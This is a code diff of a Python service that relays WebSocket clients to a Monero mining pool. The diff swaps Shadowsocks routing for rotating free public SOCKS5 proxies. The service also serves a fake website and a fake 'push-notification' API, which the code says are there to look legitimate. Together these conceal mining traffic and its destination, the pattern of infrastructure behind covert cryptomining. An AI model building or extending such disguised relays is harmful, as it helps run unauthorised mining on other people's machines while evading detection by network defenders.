@@ -5,12 +5,11 @@ import os
 import random
 import time
 import aiohttp
-import base64
 import json
 from urllib.parse import urlparse, parse_qs
 
 from aiohttp import web
-import websockets
+from aiohttp_socks import ProxyConnector, ProxyType
 
 # ---------- Configuration ----------
 PROXY_TARGET = os.environ.get('PROXY_TARGET', 'pool.supportxmr.com:5555')
@@ -18,15 +17,14 @@ ACCESS_TOKEN = os.environ.get('ACCESS_TOKEN')
 PORT = int(os.environ.get('PORT', 10000))
 MAX_CONNECTIONS = int(os.environ.get('MAX_CONNECTIONS', 500))
 
-# Shadowsocks node sources (updated frequently)
-NODE_SOURCES = [
-    "https://raw.githubusercontent.com/xyfqzy/free-nodes/main/nodes/shadowsocks.txt",
-    "https://raw.githubusercontent.com/freefq/free/master/v2",
-    "https://raw.githubusercontent.com/wrfree/free/main/ssr"
+# SOCKS5 proxy sources (updated frequently)
+PROXY_SOURCES = [
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
 ]
 
-NODE_REFRESH_INTERVAL = 3600  # Refresh nodes every hour
-SHADOWSOCKS_ENABLED = os.environ.get('SHADOWSOCKS_ENABLED', 'true').lower() == 'true'
+PROXY_REFRESH_INTERVAL = 600  # Refresh every 10 minutes
 
 # Fake site content
 FAKE_SITE = """
@@ -43,216 +41,106 @@ FAKE_SITE = """
 
 # ---------- Logging ----------
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger('obfuscated-proxy')
+logger = logging.getLogger('socks5-proxy')
 
-# ---------- Shadowsocks Node Manager ----------
-class ShadowsocksNodeManager:
+# ---------- SOCKS5 Proxy Manager ----------
+class SOCKS5Manager:
     def __init__(self):
-        self.nodes = []
-        self.current_node = None
+        self.proxies = []
+        self.current_proxy_index = 0
         self.last_refresh = 0
         
-    async def fetch_nodes(self):
-        """Fetch Shadowsocks nodes from various sources"""
-        all_nodes = []
+    async def fetch_proxies(self):
+        """Fetch SOCKS5 proxies from multiple sources"""
+        all_proxies = []
         
-        for source in NODE_SOURCES:
+        for source in PROXY_SOURCES:
             try:
                 async with aiohttp.ClientSession() as session:
                     async with session.get(source, timeout=10) as resp:
                         if resp.status == 200:
-                            content = await resp.text()
-                            nodes = self.parse_nodes(content)
-                            all_nodes.extend(nodes)
-                            logger.info(f"Fetched {len(nodes)} nodes from {source}")
+                            text = await resp.text()
+                            # Each line is "ip:port"
+                            proxies = [line.strip() for line in text.split('\n') 
+                                     if line.strip() and ':' in line.strip()]
+                            all_proxies.extend(proxies)
+                            logger.info(f"Fetched {len(proxies)} proxies from {source}")
             except Exception as e:
                 logger.error(f"Failed to fetch from {source}: {e}")
         
-        if all_nodes:
-            self.nodes = all_nodes
-            logger.info(f"Total nodes available: {len(self.nodes)}")
+        if all_proxies:
+            # Remove duplicates and shuffle
+            self.proxies = list(set(all_proxies))
+            random.shuffle(self.proxies)
+            logger.info(f"Total unique proxies available: {len(self.proxies)}")
+            
+            # Test a few to make sure they're alive
+            await self.test_proxies()
         else:
-            logger.warning("No nodes fetched, using fallback nodes")
-            # Fallback hardcoded nodes if fetch fails
-            self.nodes = self.get_fallback_nodes()
+            logger.warning("No proxies fetched, using fallback list")
+            self.proxies = self.get_fallback_proxies()
     
-    def parse_nodes(self, content):
-        """Parse Shadowsocks nodes from various formats"""
-        nodes = []
-        lines = content.strip().split('\n')
+    async def test_proxies(self):
+        """Quickly test a sample of proxies to find working ones"""
+        working = []
+        sample = self.proxies[:20]  # Test first 20
         
-        for line in lines:
-            line = line.strip()
-            if not line or line.startswith('#'):
-                continue
-            
-            # Handle ss:// URLs
-            if line.startswith('ss://'):
-                nodes.append(self.parse_ss_url(line))
-            # Handle base64 encoded lists
-            else:
-                try:
-                    decoded = base64.b64decode(line).decode('utf-8')
-                    if decoded.startswith('ss://'):
-                        nodes.append(self.parse_ss_url(decoded))
-                except:
-                    pass
+        for proxy in sample:
+            if await self.test_proxy(proxy):
+                working.append(proxy)
         
-        return [n for n in nodes if n is not None]
+        if working:
+            logger.info(f"Found {len(working)} working proxies in sample")
+            # Prioritize working ones
+            self.proxies = working + [p for p in self.proxies if p not in working]
     
-    def parse_ss_url(self, ss_url):
-        """Parse a Shadowsocks URL into connection parameters"""
+    async def test_proxy(self, proxy_str):
+        """Test if a proxy is reachable"""
         try:
-            # Format: ss://method:password@host:port#tag
-            # Or base64-encoded: ss://base64(method:password)@host:port#tag
-            import urllib.parse
-            
-            parsed = urllib.parse.urlparse(ss_url)
-            if parsed.scheme != 'ss':
-                return None
-            
-            # Split the netloc part
-            if '@' in parsed.netloc:
-                auth, hostport = parsed.netloc.split('@', 1)
-                
-                # Try to decode auth if it's base64
-                try:
-                    decoded = base64.b64decode(auth).decode('utf-8')
-                    if ':' in decoded:
-                        method, password = decoded.split(':', 1)
-                    else:
-                        method = 'aes-256-gcm'  # default
-                        password = decoded
-                except:
-                    # Not base64, might be plain method:password
-                    if ':' in auth:
-                        method, password = auth.split(':', 1)
-                    else:
-                        method = 'aes-256-gcm'
-                        password = auth
-                
-                # Parse host and port
-                if ':' in hostport:
-                    host, port_str = hostport.split(':', 1)
-                    port = int(port_str)
-                else:
-                    host = hostport
-                    port = 443
-                
-                # Get tag from fragment
-                tag = parsed.fragment if parsed.fragment else 'unknown'
-                
-                return {
-                    'method': method,
-                    'password': password,
-                    'host': host,
-                    'port': port,
-                    'tag': tag,
-                    'url': ss_url
-                }
-        except Exception as e:
-            logger.debug(f"Failed to parse SS URL {ss_url}: {e}")
-            return None
+            host, port = proxy_str.split(':')
+            port = int(port)
+            connector = ProxyConnector(
+                proxy_type=ProxyType.SOCKS5,
+                host=host,
+                port=port,
+                rdns=True
+            )
+            async with aiohttp.ClientSession(connector=connector) as session:
+                async with session.get('http://www.google.com', timeout=5) as resp:
+                    return resp.status == 200
+        except:
+            return False
     
-    def get_fallback_nodes(self):
-        """Fallback hardcoded nodes if fetch fails"""
+    def get_fallback_proxies(self):
+        """Fallback hardcoded proxies (last resort)"""
         return [
-            {
-                'method': 'chacha20-ietf-poly1305',
-                'password': '36ZCHeabUSfKjfQEvJ4HDV',
-                'host': '185.242.86.156',
-                'port': 54170,
-                'tag': 'fallback-russia'
-            },
-            {
-                'method': 'aes-256-gcm',
-                'password': 'd6105bbd-be0d-45b2-82ad-31fd1071c1d2',
-                'host': 'service.ouluyun9803.com',
-                'port': 20003,
-                'tag': 'fallback-china'
-            }
+            "45.155.68.129:8133",
+            "185.217.131.117:1080",
+            "51.158.68.133:16379"
         ]
     
-    async def refresh_nodes_if_needed(self):
-        """Refresh nodes if interval has passed"""
-        if time.time() - self.last_refresh > NODE_REFRESH_INTERVAL:
-            await self.fetch_nodes()
+    async def refresh_if_needed(self):
+        """Refresh proxy list if interval has passed"""
+        if time.time() - self.last_refresh > PROXY_REFRESH_INTERVAL:
+            await self.fetch_proxies()
             self.last_refresh = time.time()
     
-    def get_random_node(self):
-        """Get a random Shadowsocks node"""
-        if not self.nodes:
+    def get_next_proxy(self):
+        """Get next proxy in rotation (round-robin)"""
+        if not self.proxies:
             return None
-        return random.choice(self.nodes)
-    
-    async def get_best_node(self):
-        """Get the best node based on latency (simplified)"""
-        if not self.nodes:
-            await self.fetch_nodes()
-        
-        if self.nodes:
-            # For simplicity, just return a random node
-            # In a real implementation, you'd test latency
-            return random.choice(self.nodes)
-        return None
+        proxy = self.proxies[self.current_proxy_index % len(self.proxies)]
+        self.current_proxy_index += 1
+        return proxy
 
-# Initialize node manager
-node_manager = ShadowsocksNodeManager()
+# Initialize proxy manager
+proxy_manager = SOCKS5Manager()
 
 # ---------- Connection tracking ----------
 active_connections = 0
 semaphore = asyncio.Semaphore(MAX_CONNECTIONS)
 
-# ---------- Shadowsocks Connection Helper ----------
-class ShadowsocksConnection:
-    """Simulates a Shadowsocks encrypted connection"""
-    
-    def __init__(self, node):
-        self.node = node
-        self.reader = None
-        self.writer = None
-    
-    async def connect(self):
-        """Connect through Shadowsocks node"""
-        try:
-            # In a real implementation, you'd use a Shadowsocks client library
-            # For this example, we connect directly to the node and handle encryption ourselves
-            # A proper implementation would use something like:
-            # from shadowsocks import crypto, tcprelay
-            
-            # For now, we'll use a simple TCP connection to the node
-            # In reality, you'd need to implement Shadowsocks protocol
-            self.reader, self.writer = await asyncio.open_connection(
-                self.node['host'], 
-                self.node['port']
-            )
-            logger.info(f"Connected to Shadowsocks node: {self.node['tag']}")
-            return True
-        except Exception as e:
-            logger.error(f"Failed to connect to Shadowsocks node: {e}")
-            return False
-    
-    async def send(self, data):
-        """Send data through Shadowsocks (encrypted)"""
-        if self.writer:
-            # In real implementation, encrypt data here
-            self.writer.write(data)
-            await self.writer.drain()
-    
-    async def receive(self, buffer_size=4096):
-        """Receive data through Shadowsocks (decrypted)"""
-        if self.reader:
-            data = await self.reader.read(buffer_size)
-            # In real implementation, decrypt data here
-            return data
-        return None
-    
-    async def close(self):
-        if self.writer:
-            self.writer.close()
-            await self.writer.wait_closed()
-
-# ---------- WebSocket handler (with Shadowsocks routing) ----------
+# ---------- WebSocket handler (with SOCKS5 routing) ----------
 async def websocket_handler(request):
     global active_connections
     ws = web.WebSocketResponse()
@@ -272,67 +160,89 @@ async def websocket_handler(request):
         client = request.remote
         logger.info(f"New client: {client} | Active: {active_connections}")
 
-        # Get a Shadowsocks node
-        ss_node = await node_manager.get_best_node()
-        if not ss_node:
-            logger.error("No Shadowsocks nodes available")
-            await ws.close()
+        # Get a SOCKS5 proxy
+        proxy_str = proxy_manager.get_next_proxy()
+        if not proxy_str:
+            logger.error("No SOCKS5 proxies available")
+            await ws.close(code=1011, message='No proxy available')
             return ws
 
+        # Parse proxy
+        proxy_host, proxy_port = proxy_str.split(':')
+        proxy_port = int(proxy_port)
+        
         # Parse pool host and port
         pool_host, pool_port_str = PROXY_TARGET.split(':')
         pool_port = int(pool_port_str)
 
-        # Connect through Shadowsocks
-        ss_conn = ShadowsocksConnection(ss_node)
-        if not await ss_conn.connect():
-            logger.error("Failed to establish Shadowsocks connection")
-            await ws.close()
-            return ws
-
-        # Now we need to tell the Shadowsocks node where to connect to
-        # In Shadowsocks protocol, this is handled automatically
-        # For simplicity, we'll assume the node is configured to forward to our target
-        # In reality, you'd need to send the destination address through the encrypted channel
-
-        # Forward data between WebSocket and Shadowsocks
-        async def ws_to_ss():
-            try:
-                async for msg in ws:
-                    if msg.type == web.WSMsgType.BINARY:
-                        await ss_conn.send(msg.data)
-                    elif msg.type == web.WSMsgType.TEXT:
-                        await ss_conn.send(msg.data.encode())
-            except Exception as e:
-                logger.debug(f"ws_to_ss error: {e}")
-            finally:
-                await ss_conn.close()
-
-        async def ss_to_ws():
-            try:
-                while True:
-                    data = await ss_conn.receive(4096)
-                    if not data:
-                        break
-                    await ws.send_bytes(data)
-            except Exception as e:
-                logger.debug(f"ss_to_ws error: {e}")
-            finally:
-                await ws.close()
-
-        # Run both forwarding tasks concurrently
-        task1 = asyncio.create_task(ws_to_ss())
-        task2 = asyncio.create_task(ss_to_ws())
-
-        done, pending = await asyncio.wait(
-            [task1, task2],
-            return_when=asyncio.FIRST_COMPLETED
+        # Create SOCKS5 connector
+        connector = ProxyConnector(
+            proxy_type=ProxyType.SOCKS5,
+            host=proxy_host,
+            port=proxy_port,
+            rdns=True
         )
-        for task in pending:
-            task.cancel()
 
-        active_connections -= 1
-        logger.info(f"Client disconnected: {client} | Active: {active_connections}")
+        try:
+            # Connect to pool through SOCKS5 proxy
+            logger.info(f"Connecting via SOCKS5 proxy {proxy_host}:{proxy_port}")
+            
+            # Create TCP connection through SOCKS5
+            from aiohttp_socks.utils import open_connection
+            pool_reader, pool_writer = await open_connection(
+                proxy_type=ProxyType.SOCKS5,
+                proxy_host=proxy_host,
+                proxy_port=proxy_port,
+                host=pool_host,
+                port=pool_port,
+                rdns=True
+            )
+            logger.info(f"Connected to pool {PROXY_TARGET} via proxy for {client}")
+
+            # Forward data between WebSocket and TCP socket
+            async def ws_to_pool():
+                try:
+                    async for msg in ws:
+                        if msg.type == web.WSMsgType.BINARY:
+                            pool_writer.write(msg.data)
+                        elif msg.type == web.WSMsgType.TEXT:
+                            pool_writer.write(msg.data.encode())
+                        await pool_writer.drain()
+                except Exception as e:
+                    logger.debug(f"ws_to_pool error: {e}")
+                finally:
+                    pool_writer.close()
+                    await pool_writer.wait_closed()
+
+            async def pool_to_ws():
+                try:
+                    while True:
+                        data = await pool_reader.read(4096)
+                        if not data:
+                            break
+                        await ws.send_bytes(data)
+                except Exception as e:
+                    logger.debug(f"pool_to_ws error: {e}")
+                finally:
+                    await ws.close()
+
+            # Run both forwarding tasks concurrently
+            task1 = asyncio.create_task(ws_to_pool())
+            task2 = asyncio.create_task(pool_to_ws())
+
+            done, pending = await asyncio.wait(
+                [task1, task2],
+                return_when=asyncio.FIRST_COMPLETED
+            )
+            for task in pending:
+                task.cancel()
+
+        except Exception as e:
+            logger.error(f"Connection failed via proxy {proxy_str}: {e}")
+            await ws.close(code=1011, message='Connection failed')
+        finally:
+            active_connections -= 1
+            logger.info(f"Client disconnected: {client} | Active: {active_connections}")
 
     return ws
 
@@ -341,9 +251,9 @@ async def health_check(request):
     return web.json_response({
         "status": "healthy",
         "active_connections": active_connections,
-        "nodes_available": len(node_manager.nodes),
+        "proxies_available": len(proxy_manager.proxies),
         "uptime": time.time() - start_time,
-        "version": "2.3.1"
+        "version": "3.0.0"
     })
 
 # ---------- Fake API endpoints ----------
@@ -353,26 +263,27 @@ async def root_handler(request):
 async def api_status(request):
     return web.json_response({
         "service": "push-notification",
-        "version": "2.3.1",
+        "version": "3.0.0",
         "ws_endpoint": "/api/v1/push"
     })
 
-# ---------- Background node refresher ----------
-async def node_refresher():
-    """Periodically refresh Shadowsocks nodes"""
+# ---------- Background proxy refresher ----------
+async def proxy_refresher():
+    """Periodically refresh SOCKS5 proxies"""
     while True:
-        await node_manager.refresh_nodes_if_needed()
-        await asyncio.sleep(300)  # Check every 5 minutes
+        await proxy_manager.refresh_if_needed()
+        await asyncio.sleep(60)  # Check every minute
 
 # ---------- Main ----------
 start_time = time.time()
 
 async def main():
-    # Initial node fetch
-    await node_manager.fetch_nodes()
+    # Initial proxy fetch
+    await proxy_manager.fetch_proxies()
+    proxy_manager.last_refresh = time.time()
     
     # Start background refresher
-    asyncio.create_task(node_refresher())
+    asyncio.create_task(proxy_refresher())
     
     app = web.Application()
     # Fake website to look legitimate
@@ -390,7 +301,7 @@ async def main():
     logger.info(f"Service running on port {PORT}")
     logger.info(f"Fake site: http://localhost:{PORT}/")
     logger.info(f"WebSocket endpoint: ws://localhost:{PORT}/api/v1/push")
-    logger.info(f"Shadowsocks enabled: {SHADOWSOCKS_ENABLED}")
+    logger.info(f"SOCKS5 proxies loaded: {len(proxy_manager.proxies)}")
 
     await asyncio.Event().wait()
 
